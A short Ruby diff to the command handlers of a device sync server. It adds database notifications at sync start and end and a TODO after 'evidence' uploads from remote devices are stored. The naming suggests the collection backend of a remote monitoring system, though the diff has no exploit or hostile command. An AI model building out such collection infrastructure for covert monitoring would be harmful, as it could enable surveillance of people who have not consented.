@@ -62,7 +62,7 @@ module Commands
     now = Time.now - Time.now.utc_offset
 
     # notify the database that the sync is in progress
-    DB.instance.sync_for session[:bid], version, user_id, device_id, source_id, now
+    DB.instance.sync_start session[:bid], version, user_id, device_id, source_id, now
 
     # notify the Evidence Manager that the sync is in progress
     EvidenceManager.instance.sync_start session, version, user_id, device_id, source_id, now
@@ -112,7 +112,10 @@ module Commands
   # <- PROTO_OK
   def command_bye(peer, session, message)
 
-    # notify the pusher that the sync has ended
+    # notify the database that the sync is ended
+    DB.instance.sync_end session[:bid]
+    
+    # notify the Evidence Manager that the sync has ended
     EvidenceManager.instance.sync_end session
 
     # destroy the current session
@@ -275,6 +278,8 @@ module Commands
     # send the evidence to the db
     begin
       EvidenceManager.instance.store session, size, message
+      #TODO: notify the pusher to send the evidence to db
+          
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
